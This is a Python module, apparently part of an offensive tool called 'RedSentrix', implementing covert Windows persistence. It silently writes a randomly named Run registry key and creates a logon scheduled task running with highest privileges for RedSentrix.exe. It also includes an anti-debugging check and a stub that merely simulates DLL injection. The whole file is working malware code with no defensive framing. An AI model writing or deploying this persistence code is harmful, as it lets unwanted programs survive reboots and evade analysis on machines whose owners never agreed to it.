import platform
import os
import subprocess
import random
import ctypes
import time
import uuid

class CovertPersistence:
    def __init__(self):
        self.methods = [
            self.run_key_persistence,
            self.scheduled_task_persistence,
            self.fake_dll_injection
        ]

    def execute(self):
        if platform.system() != "Windows":
            return "Persistence not supported on non-Windows systems."

        results = []
        for method in self.methods:
            try:
                result = method()
                results.append(f"[+] {method.__name__}: {result}")
            except Exception as e:
                results.append(f"[-] {method.__name__} failed: {str(e)}")
        return "\n".join(results)

    def run_key_persistence(self):
        key_name = f"RedSentrix_{uuid.uuid4().hex[:6]}"
        path = os.path.abspath("RedSentrix.exe")
        command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {key_name} /d "{path}" /f'
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"Added Run key: {key_name} -> {path}"

    def scheduled_task_persistence(self):
        task_name = f"RedSentrixTask_{uuid.uuid4().hex[:5]}"
        exe_path = os.path.abspath("RedSentrix.exe")
        command = f'schtasks /create /tn {task_name} /tr "{exe_path}" /sc onlogon /rl HIGHEST /f'
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"Created scheduled task: {task_name}"

    def fake_dll_injection(self):
        dll_name = f"{uuid.uuid4().hex}.dll"
        return f"Simulated DLL injection with: {dll_name}"

    def anti_debug_check(self):
        # Anti-debugging: IsDebuggerPresent
        return bool(ctypes.windll.kernel32.IsDebuggerPresent()) if platform.system() == "Windows" else False
